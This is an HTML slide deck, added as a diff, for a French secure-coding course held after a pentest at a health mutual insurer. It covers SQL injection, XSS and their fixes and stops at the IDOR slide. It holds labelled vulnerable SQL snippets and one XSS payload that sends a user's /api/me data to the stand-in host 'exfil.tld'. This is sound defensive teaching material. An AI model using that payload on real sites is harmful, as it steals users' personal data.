@@ -1,0 +1,1686 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Formation : Développement Sécurisé</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            cyber: {
+              dark: '#0f172a',
+              card: '#1e293b',
+              text: '#94a3b8',
+              light: '#e2e8f0',
+              accent: '#22d3ee',
+              danger: '#ef4444',
+              success: '#10b981',
+              warning: '#f59e0b'
+            }
+          },
+          fontFamily: {
+            mono: ['"JetBrains Mono"', 'monospace'],
+            sans: ['"Inter"', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      background-color: #0f172a;
+      color: #e2e8f0;
+      overflow: hidden;
+      font-family: Inter, sans-serif;
+    }
+
+    .slide {
+      display: none;
+      height: 100vh;
+      width: 100vw;
+      padding: 5rem 4rem 5rem 4rem; /* top/bottom for HUD + nav */
+      flex-direction: column;
+      animation: fadeIn 0.35s ease-out;
+      overflow-y: auto;
+    }
+    .slide.active { display: flex; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .terminal-box {
+      background: #020617;
+      border: 1px solid #334155;
+      border-radius: 0.5rem;
+      font-family: 'JetBrains Mono', monospace;
+      box-shadow: 0 4px 10px -2px rgba(0, 0, 0, 0.65);
+    }
+    .terminal-header {
+      background: #1e293b;
+      padding: 0.5rem 1rem;
+      border-bottom: 1px solid #334155;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      border-top-left-radius: 0.5rem;
+      border-top-right-radius: 0.5rem;
+    }
+    .dot { width: 0.75rem; height: 0.75rem; border-radius: 50%; }
+    .dot-red { background-color: #ef4444; }
+    .dot-yellow { background-color: #f59e0b; }
+    .dot-green { background-color: #10b981; }
+
+    .code-keyword { color: #c084fc; }
+    .code-func { color: #60a5fa; }
+    .code-string { color: #4ade80; }
+    .code-comment { color: #64748b; font-style: italic; }
+    .code-danger { color: #ef4444; font-weight: bold; text-decoration: underline; }
+    .code-warn { color: #f59e0b; font-weight: bold; }
+
+    @keyframes neon-breath {
+      0% { box-shadow: 0 0 6px rgba(34, 211, 238, 0.25); border-color: rgba(51, 65, 85, 1); }
+      50% { box-shadow: 0 0 18px rgba(34, 211, 238, 0.45); border-color: #22d3ee; }
+      100% { box-shadow: 0 0 6px rgba(34, 211, 238, 0.25); border-color: rgba(51, 65, 85, 1); }
+    }
+    .interactive-card:hover {
+      animation: neon-breath 1.5s infinite ease-in-out;
+      transform: scale(1.01);
+      z-index: 20;
+      cursor: pointer;
+      background-color: rgba(30, 41, 59, 0.95);
+    }
+
+    /* Modal */
+    .modal-overlay {
+      backdrop-filter: blur(6px);
+      background-color: rgba(15, 23, 42, 0.9);
+    }
+    .modal-content { max-width: 1100px; margin: 0 auto; }
+
+    /* HUD */
+    #hud { pointer-events: none; }
+    #hud * { pointer-events: auto; }
+  </style>
+</head>
+
+<body class="antialiased">
+
+  <!-- Laser pointer (optionnel) -->
+  <div id="laser" class="fixed w-3 h-3 bg-red-500 rounded-full blur-sm opacity-40 pointer-events-none z-[100]" style="transition: left 0.08s, top 0.08s;"></div>
+  <script>
+    document.addEventListener("mousemove", e => {
+      const l = document.getElementById("laser");
+      l.style.left = e.clientX + "px";
+      l.style.top = e.clientY + "px";
+    });
+  </script>
+
+  <!-- HUD: titre + compteur + progress -->
+  <div id="hud" class="fixed top-0 left-0 right-0 z-40 px-6 py-4">
+    <div class="flex items-center justify-between gap-6">
+      <div class="flex items-center gap-3">
+        <span class="font-mono text-cyber-accent text-sm border border-cyber-accent/70 px-3 py-1 rounded">
+          Formation Technique Post-Pentest
+        </span>
+        <span id="hudTitle" class="text-sm text-slate-200 font-semibold"></span>
+      </div>
+      <div class="flex items-center gap-4">
+        <span id="hudCounter" class="font-mono text-xs text-slate-300"></span>
+        <span class="font-mono text-xs text-slate-500">Clavier: ← → Espace | Esc (modals)</span>
+      </div>
+    </div>
+    <div class="mt-3 w-full h-1 bg-slate-800 rounded overflow-hidden">
+      <div id="hudProgress" class="h-1 bg-cyber-accent" style="width: 0%"></div>
+    </div>
+  </div>
+
+  <!-- Nav buttons -->
+  <div class="fixed bottom-0 left-0 right-0 z-40 px-6 py-4 flex justify-between items-center bg-gradient-to-t from-slate-950/70 to-transparent">
+    <button id="btnPrev" class="bg-slate-800 hover:bg-slate-700 border border-slate-600 text-white px-4 py-2 rounded font-mono text-sm">
+      <i class="fa-solid fa-arrow-left mr-2"></i>Précédent
+    </button>
+    <button id="btnNext" class="bg-slate-800 hover:bg-slate-700 border border-slate-600 text-white px-4 py-2 rounded font-mono text-sm">
+      Suivant<i class="fa-solid fa-arrow-right ml-2"></i>
+    </button>
+  </div>
+
+  <main id="deck">
+
+    <!-- SLIDE 0: Cover -->
+    <div class="slide active justify-center items-center text-center relative overflow-hidden" id="slide-0" data-title="Titre & Contexte">
+      <div class="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-10"></div>
+
+      <div class="z-10 mb-4 text-cyber-accent font-mono text-sm tracking-[0.3em] uppercase border border-cyber-accent px-4 py-1 rounded">
+        Développement Sécurisé
+      </div>
+
+      <h1 class="z-10 text-5xl md:text-7xl font-bold font-mono text-white mb-6 tracking-tighter">
+        DE LA THÉORIE À LA <span class="text-cyber-accent">PRATIQUE</span>
+      </h1>
+
+      <div class="z-10 w-28 h-1 bg-cyber-accent mb-8 mx-auto"></div>
+
+      <p class="z-10 text-xl text-cyber-text font-mono mb-10 max-w-3xl">
+        Sécuriser le code d'une Mutuelle post-pentest, sans ralentir la livraison.
+      </p>
+
+      <div class="z-10 grid grid-cols-1 md:grid-cols-3 gap-4 max-w-4xl w-full">
+        <div class="bg-cyber-card border border-slate-700 p-5 rounded-lg text-left">
+          <div class="text-slate-200 font-mono font-bold mb-2"><i class="fa-solid fa-crosshairs mr-2"></i>Objectif</div>
+          <p class="text-sm text-slate-300">Réduire les failles évitables via règles, patterns et automatisation.</p>
+        </div>
+        <div class="bg-cyber-card border border-slate-700 p-5 rounded-lg text-left">
+          <div class="text-slate-200 font-mono font-bold mb-2"><i class="fa-solid fa-user-group mr-2"></i>Public</div>
+          <p class="text-sm text-slate-300">Développeurs, Tech Leads, Architectes.</p>
+        </div>
+        <div class="bg-cyber-card border border-slate-700 p-5 rounded-lg text-left">
+          <div class="text-slate-200 font-mono font-bold mb-2"><i class="fa-solid fa-stopwatch mr-2"></i>Format</div>
+          <p class="text-sm text-slate-300">Modules courts, exemples concrets, checklists “prêtes à PR”.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 1: Pourquoi / Contexte -->
+    <div class="slide justify-center" id="slide-1" data-title="Le Pourquoi (Contexte Mutuelle)">
+      <div class="flex items-center gap-4 mb-8 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">INTRO</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Le “Pourquoi”</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
+        <div class="space-y-6">
+          <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl border-l-4 border-l-cyber-danger">
+            <h3 class="text-xl font-bold text-white mb-2 font-mono"><i class="fa-solid fa-bug mr-2 text-red-500"></i>Retour pentest</h3>
+            <p class="text-cyber-text mb-4">Le dernier audit a révélé des classes de failles évitables. L’objectif ici n’est pas de “blâmer”, mais de rendre ces classes impossibles à réintroduire.</p>
+            <ul class="list-disc list-inside text-sm text-slate-300 font-mono space-y-1">
+              <li>Injections (SQLi), XSS, SSRF</li>
+              <li>Contrôle d’accès (IDOR / BOLA)</li>
+              <li>Fuites d’information (logs, erreurs, secrets, dépendances)</li>
+              <li>Hygiène CI/CD incomplète (SAST/SCA/secrets)</li>
+            </ul>
+          </div>
+
+          <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl border-l-4 border-l-cyber-accent">
+            <h3 class="text-xl font-bold text-white mb-2 font-mono"><i class="fa-solid fa-shield-heart mr-2"></i>Enjeu Mutuelle</h3>
+            <p class="text-sm text-slate-300">
+              Données de santé, données personnelles, parfois bancaires.  
+              Une faille n’est pas seulement “un bug”: impact adhérents, perte de confiance, exposition réglementaire.
+            </p>
+            <div class="mt-4 grid grid-cols-1 md:grid-cols-3 gap-3">
+              <div class="bg-slate-900 border border-slate-700 rounded p-3 text-xs text-slate-300 font-mono">
+                <div class="text-cyber-accent font-bold mb-1">Confiance</div>
+                Une fuite détruit la relation avec l’adhérent.
+              </div>
+              <div class="bg-slate-900 border border-slate-700 rounded p-3 text-xs text-slate-300 font-mono">
+                <div class="text-cyber-accent font-bold mb-1">Réglementaire</div>
+                Traçabilité, minimisation, confidentialité.
+              </div>
+              <div class="bg-slate-900 border border-slate-700 rounded p-3 text-xs text-slate-300 font-mono">
+                <div class="text-cyber-accent font-bold mb-1">Opérationnel</div>
+                Incident = gel des releases + crise.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="terminal-box flex flex-col">
+          <div class="terminal-header">
+            <div class="dot dot-red"></div>
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-green"></div>
+            <span class="text-xs text-slate-400 font-mono ml-2">goals.txt</span>
+          </div>
+          <div class="p-5 text-sm font-mono text-cyber-light space-y-4">
+            <p class="text-green-400"># Objectifs</p>
+            <p>> 1. Lire une faille comme une chaîne Source -> Contrôles -> Sink.</p>
+            <p>> 2. Mettre des garde-fous reproductibles (patterns + outils).</p>
+            <p>> 3. Industrialiser léger: CI/CD bloque les régressions.</p>
+            <p class="text-yellow-400 mt-6"># Approche</p>
+            <p>> Security by Design: la sécurité comme invariant du code.</p>
+            <p>> Sécurisé ne doit pas être plus lent: standards + automatisation.</p>
+            <p class="text-slate-500 mt-6 text-xs">
+              Livrable attendu après formation: checklist PR + pipeline minimal (secrets, SAST, SCA).
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 2: Mindset / Anatomie -->
+    <div class="slide justify-center" id="slide-2" data-title="Mindset : Anatomie d'une vulnérabilité">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 0</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Anatomie d'une faille</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-10 items-center">
+        <div class="space-y-6">
+          <h3 class="text-2xl font-bold text-white">Cycle Source → Contrôles → Sink</h3>
+
+          <div class="grid grid-cols-1 gap-4">
+            <div class="bg-slate-800 p-4 rounded border border-red-500/50 flex items-start gap-4">
+              <div class="text-3xl text-red-500 pt-1"><i class="fa-solid fa-faucet-drip"></i></div>
+              <div>
+                <h4 class="font-bold text-white">1) SOURCE</h4>
+                <p class="text-xs text-slate-400">Body JSON, query params, cookies, headers, webhooks, fichiers, DB, API externes.</p>
+                <p class="text-xs text-red-300 mt-2 font-mono">Règle: toute donnée externe = non fiable.</p>
+              </div>
+            </div>
+
+            <div class="bg-slate-800 p-4 rounded border border-yellow-500/50 flex items-start gap-4">
+              <div class="text-3xl text-yellow-500 pt-1"><i class="fa-solid fa-filter"></i></div>
+              <div>
+                <h4 class="font-bold text-white">2) CONTRÔLES</h4>
+                <p class="text-xs text-slate-400">Validation/typage, encodage, authN/authZ, allowlists, timeouts, quotas, logs propres.</p>
+                <p class="text-xs text-yellow-300 mt-2 font-mono">La faille apparaît quand un contrôle manque ou est contournable.</p>
+              </div>
+            </div>
+
+            <div class="bg-slate-800 p-4 rounded border border-green-500/50 flex items-start gap-4">
+              <div class="text-3xl text-green-500 pt-1"><i class="fa-solid fa-bomb"></i></div>
+              <div>
+                <h4 class="font-bold text-white">3) SINK</h4>
+                <p class="text-xs text-slate-400">SQL execute, template non échappé, innerHTML, requêtes sortantes, désérialisation, interpréteur.</p>
+                <p class="text-xs text-green-300 mt-2 font-mono">La donnée devient du code, ou pilote une action dangereuse.</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="bg-cyber-card border border-slate-700 p-5 rounded-xl">
+            <h4 class="text-white font-bold mb-2 font-mono">Lecture “attaquant”</h4>
+            <ul class="text-sm text-slate-300 space-y-2 list-disc pl-5">
+              <li>Identifier une source: “où puis-je injecter?”</li>
+              <li>Identifier un sink: “où cela est exécuté/interprété?”</li>
+              <li>Identifier le contrôle manquant: “qu’est-ce qui devrait bloquer?”</li>
+              <li>Évaluer l’impact: données, intégrité, latéralisation, exposition.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card p-6 rounded-xl border border-slate-700">
+          <h3 class="text-xl font-bold text-white mb-4 text-center">Coût de correction (ordre de grandeur)</h3>
+          <canvas id="costChart"></canvas>
+          <p class="text-center text-xs text-slate-400 mt-4">
+            Corriger tôt = rapide. Corriger tard = coordination + incident + retours arrière.
+          </p>
+
+          <div class="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="terminal-box">
+              <div class="terminal-header">
+                <span class="text-xs text-slate-300 font-bold">Signal</span>
+                <span class="text-xs text-slate-500 ml-auto">code smell</span>
+              </div>
+              <div class="p-4 text-xs text-slate-200 font-mono space-y-2">
+                <p><span class="code-warn">1)</span> concat SQL / HTML / URL</p>
+                <p><span class="code-warn">2)</span> req.body utilisé “tel quel”</p>
+                <p><span class="code-warn">3)</span> autorisation absente (auth uniquement)</p>
+                <p><span class="code-warn">4)</span> logs trop bavards / stacktrace en prod</p>
+              </div>
+            </div>
+
+            <div class="terminal-box">
+              <div class="terminal-header">
+                <span class="text-xs text-slate-300 font-bold">Réponse</span>
+                <span class="text-xs text-slate-500 ml-auto">pattern</span>
+              </div>
+              <div class="p-4 text-xs text-slate-200 font-mono space-y-2">
+                <p><span class="code-string">A)</span> requêtes paramétrées</p>
+                <p><span class="code-string">B)</span> DTO + validation serveur</p>
+                <p><span class="code-string">C)</span> policy d’accès objet</p>
+                <p><span class="code-string">D)</span> erreurs centralisées + redaction</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 3: SQLi -->
+    <div class="slide justify-center" id="slide-3" data-title="Confiance Zéro : SQL Injection (SQLi)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 1</span>
+        <h2 class="text-4xl font-bold font-mono text-white">SQL Injection (SQLi)</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="terminal-box flex flex-col interactive-card" onclick="openModal('modal-sqli')">
+          <div class="terminal-header">
+            <span class="text-xs text-red-400 font-bold">Quand la donnée devient du SQL</span>
+            <span class="text-xs text-slate-500 ml-auto">clique: détail remédiation</span>
+          </div>
+          <div class="p-6 space-y-5">
+            <div>
+              <div class="text-5xl text-slate-700 mb-4"><i class="fa-solid fa-database"></i></div>
+              <h3 class="text-2xl font-bold text-white mb-2">Symptôme principal</h3>
+              <p class="text-slate-300 text-sm">
+                Construction dynamique de requête par concaténation ou interpolation directe d’un input.
+              </p>
+            </div>
+
+            <div class="bg-red-900/20 border border-red-500/30 rounded p-4 text-xs font-mono text-red-200">
+              <div class="text-red-300 font-bold mb-2">Exemple vulnérable</div>
+              SELECT * FROM users WHERE name = '<span class="code-danger">" + userInput + "</span>';
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div class="bg-slate-900 border border-slate-700 rounded p-4">
+                <div class="text-slate-200 font-bold font-mono text-sm mb-2">Conséquences</div>
+                <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                  <li>Dump base adhérents</li>
+                  <li>Bypass auth / extraction PII</li>
+                  <li>Altération / suppression</li>
+                  <li>Pivot applicatif (selon DB/permissions)</li>
+                </ul>
+              </div>
+              <div class="bg-slate-900 border border-slate-700 rounded p-4">
+                <div class="text-slate-200 font-bold font-mono text-sm mb-2">Variantes</div>
+                <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                  <li>Union-based</li>
+                  <li>Blind (time/error)</li>
+                  <li>Second-order</li>
+                  <li>Injection via ORM mal utilisé</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="text-slate-400 text-sm">
+              Signal pratique: si tu vois <span class="font-mono text-slate-200">"SELECT ... " + param</span>, tu es déjà dans le rouge.
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Règles simples (à mettre dans une checklist PR)</h3>
+          <div class="space-y-4">
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="font-mono text-sm text-cyber-accent font-bold mb-2">Interdit</div>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>Concat SQL, même “pour gagner du temps”</li>
+                <li>Nettoyage “maison” (regex / replace) pour “sanitizer”</li>
+                <li>Construction de clauses dynamiques non allowlistées (ORDER BY, LIMIT, colonnes)</li>
+              </ul>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="font-mono text-sm text-green-300 font-bold mb-2">Obligatoire</div>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>Requêtes paramétrées (prepared statements / bind)</li>
+                <li>Validation de type/format en amont (DTO)</li>
+                <li>Principe de moindre privilège sur l’utilisateur DB</li>
+                <li>Logs propres: pas de dump de requêtes complètes avec valeurs sensibles</li>
+              </ul>
+            </div>
+
+            <div class="terminal-box">
+              <div class="terminal-header">
+                <span class="text-xs text-slate-300 font-bold">Piège fréquent</span>
+                <span class="text-xs text-slate-500 ml-auto">ORM</span>
+              </div>
+              <div class="p-4 text-xs font-mono text-slate-200 space-y-2">
+                <p class="code-comment">// Certains ORMs “paramètrent” les valeurs, mais pas les identifiants.</p>
+                <p>ORDER BY <span class="code-danger">${userSort}</span>  <span class="code-comment">// identifiant = allowlist obligatoire</span></p>
+                <p class="code-comment">// Solution: mapping “safe” des colonnes autorisées.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 4: Remédiation SQLi -->
+    <div class="slide justify-center" id="slide-4" data-title="Remédiation SQLi : Prepared Statements">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 1</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Remédiation SQLi</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Principe</h3>
+          <p class="text-slate-300 text-sm mb-4">
+            Le moteur SQL doit recevoir la requête “compilée” avec des paramètres séparés.  
+            La valeur utilisateur est une donnée, jamais un fragment de requête.
+          </p>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-red-400 font-bold">MAUVAIS</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              String q = "SELECT * FROM users WHERE name = '" + <span class="code-danger">userInput</span> + "'";<br>
+              stmt.execute(q);
+            </div>
+          </div>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-green-400 font-bold">BON (Java)</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              String q = "SELECT * FROM users WHERE name = <span class="code-string">?</span>";<br>
+              PreparedStatement ps = conn.prepareStatement(q);<br>
+              ps.setString(1, <span class="code-string">userInput</span>);<br>
+              ps.executeQuery();
+            </div>
+          </div>
+
+          <div class="terminal-box">
+            <div class="terminal-header text-xs text-green-400 font-bold">BON (Node / pg)</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              const q = "SELECT * FROM users WHERE name = <span class="code-string">$1</span>";<br>
+              const rows = await db.query(q, [<span class="code-string">userInput</span>]);
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Points d’attention</h3>
+
+          <div class="space-y-4">
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">1) Identifiants dynamiques</div>
+              <p class="text-sm text-slate-300">
+                On ne “bind” pas un nom de colonne / table. Pour ORDER BY, limiter via allowlist:
+              </p>
+              <div class="terminal-box mt-3">
+                <div class="p-3 text-xs font-mono text-slate-200">
+                  const sortMap = { date: "created_at", nom: "last_name" };<br>
+                  const sort = sortMap[req.query.sort] || "created_at";<br>
+                  const q = `SELECT * FROM users ORDER BY ${sort} DESC`;
+                </div>
+              </div>
+              <p class="text-xs text-slate-400 mt-2">Le paramètre utilisateur ne doit jamais être injecté directement.</p>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">2) Moindre privilège DB</div>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>Compte applicatif sans droits d’administration</li>
+                <li>Séparer lecture/écriture si possible</li>
+                <li>Auditer les requêtes anormales (sans logguer les valeurs sensibles)</li>
+              </ul>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">3) Tests de non-régression</div>
+              <p class="text-sm text-slate-300">
+                Ajouter un test qui injecte une payload classique et vérifie que la requête échoue proprement
+                (ou retourne 0 résultat) sans erreur SQL.
+              </p>
+            </div>
+
+            <div class="bg-green-900/20 border border-green-500/30 p-4 rounded text-sm text-green-200">
+              Standard attendu: “0 concat SQL” dans le code review.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 5: XSS -->
+    <div class="slide justify-center" id="slide-5" data-title="Confiance Zéro : XSS (Cross-Site Scripting)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 1</span>
+        <h2 class="text-4xl font-bold font-mono text-white">XSS (Cross-Site Scripting)</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="terminal-box flex flex-col interactive-card" onclick="openModal('modal-xss')">
+          <div class="terminal-header">
+            <span class="text-xs text-yellow-400 font-bold">Exécution de script côté navigateur</span>
+            <span class="text-xs text-slate-500 ml-auto">clique: détail remédiation</span>
+          </div>
+          <div class="p-6 space-y-5">
+            <div>
+              <div class="text-5xl text-slate-700 mb-4"><i class="fa-brands fa-js"></i></div>
+              <h3 class="text-2xl font-bold text-white mb-2">Ce que l’attaquant gagne</h3>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>Vol de session (selon cookie/stockage)</li>
+                <li>Actions au nom de l’utilisateur (transactions, changement email, etc.)</li>
+                <li>Phishing interne, redirections, keylogging</li>
+                <li>Dégradation confiance, exposition data</li>
+              </ul>
+            </div>
+
+            <div class="bg-yellow-900/20 border border-yellow-500/30 rounded p-4 text-xs font-mono text-yellow-100 break-all">
+              &lt;img src=x onerror="fetch('/api/me').then(r=&gt;r.text()).then(t=&gt;fetch('https://exfil.tld?d='+encodeURIComponent(t)))"&gt;
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+              <div class="bg-slate-900 border border-slate-700 rounded p-3">
+                <div class="text-slate-200 font-mono font-bold text-xs mb-1">Reflected</div>
+                <p class="text-xs text-slate-300">Payload renvoyée dans la réponse.</p>
+              </div>
+              <div class="bg-slate-900 border border-slate-700 rounded p-3">
+                <div class="text-slate-200 font-mono font-bold text-xs mb-1">Stored</div>
+                <p class="text-xs text-slate-300">Payload stockée (DB) et rejouée.</p>
+              </div>
+              <div class="bg-slate-900 border border-slate-700 rounded p-3">
+                <div class="text-slate-200 font-mono font-bold text-xs mb-1">DOM</div>
+                <p class="text-xs text-slate-300">Manipulation JS côté client.</p>
+              </div>
+            </div>
+
+            <div class="text-slate-400 text-sm">
+              Signal pratique: <span class="font-mono text-slate-200">innerHTML</span>, <span class="font-mono text-slate-200">dangerouslySetInnerHTML</span>,
+              templates non échappées, markdown rendu sans sanitize.
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Où ça arrive (très souvent)</h3>
+
+          <div class="space-y-4">
+            <div class="terminal-box">
+              <div class="terminal-header">
+                <span class="text-xs text-slate-300 font-bold">Vulnérable</span>
+                <span class="text-xs text-slate-500 ml-auto">client</span>
+              </div>
+              <div class="p-4 text-xs font-mono text-slate-200 space-y-2">
+                <p>output.innerHTML = <span class="code-danger">userComment</span>;</p>
+                <p class="code-comment">// ou insertion dans un attribut:</p>
+                <p>el.setAttribute("href", <span class="code-danger">userUrl</span>);</p>
+              </div>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Règle</div>
+              <p class="text-sm text-slate-300">
+                La sortie doit être encodée selon le contexte (HTML, attribut, URL, JS).  
+                Les frameworks modernes protègent souvent “par défaut”, mais pas quand on force du HTML brut.
+              </p>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Défense en profondeur</div>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>CSP strict (réduit l’impact si une XSS passe)</li>
+                <li>Cookies HttpOnly/SameSite (limite certains scénarios)</li>
+                <li>Réduction des surfaces: pas de rendu HTML non nécessaire</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 6: Remédiation XSS -->
+    <div class="slide justify-center" id="slide-6" data-title="Remédiation XSS : Encodage + CSP">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 1</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Remédiation XSS</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Encodage contextuel</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            Même logique que SQLi: séparer “donnée” et “code”.  
+            Ici, on empêche l’interpréteur HTML/JS du navigateur de traiter l’input comme du script.
+          </p>
+
+          <div class="grid grid-cols-1 gap-4">
+            <div class="terminal-box">
+              <div class="terminal-header">
+                <span class="text-xs text-slate-300 font-bold">Contextes</span>
+              </div>
+              <div class="p-4 text-xs font-mono text-slate-200 space-y-2">
+                <p><span class="code-string">HTML</span> : &lt; &gt; " ' deviennent entités</p>
+                <p><span class="code-string">Attribut</span> : encodage + contrôle schémas (http/https)</p>
+                <p><span class="code-string">URL</span> : encodeURIComponent + allowlist</p>
+                <p><span class="code-string">JS</span> : éviter injection dans string exécutée</p>
+              </div>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Frameworks</div>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>React/Vue/Angular: échappent par défaut</li>
+                <li>Danger: <span class="font-mono">dangerouslySetInnerHTML</span>, <span class="font-mono">v-html</span>, templates “raw”</li>
+                <li>Si HTML nécessaire: sanitizer éprouvé + allowlist (tags/attributs)</li>
+              </ul>
+            </div>
+
+            <div class="bg-red-900/20 border border-red-500/30 p-4 rounded text-sm text-red-200">
+              Interdit: “sanitize” maison. Utiliser des bibliothèques et une politique d’allowlist.
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">CSP (Content Security Policy)</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            La CSP réduit l’exploitabilité en bloquant l’exécution de scripts non autorisés (inline, domaines non approuvés).
+          </p>
+
+          <div class="terminal-box mb-s">
+            <div class="terminal-header">
+              <span class="text-xs text-slate-300 font-bold">Exemple (point de départ)</span>
+            </div>
+            <div class="p-4 text-xs font-mono text-slate-200 break-all">
+              Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';
+            </div>
+          </div>
+
+          <div class="mt-4 bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Headers associés</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Strict-Transport-Security (HSTS)</li>
+              <li>X-Content-Type-Options: nosniff</li>
+              <li>Referrer-Policy</li>
+              <li>Permissions-Policy</li>
+            </ul>
+          </div>
+
+          <div class="mt-4 bg-green-900/20 border border-green-500/30 p-4 rounded text-sm text-green-200">
+            Standard attendu: pas de rendu HTML brut sans justification + CSP minimale en prod.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 7: IDOR / BOLA -->
+    <div class="slide justify-center" id="slide-7" data-title="Logique & Accès : IDOR / BOLA">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
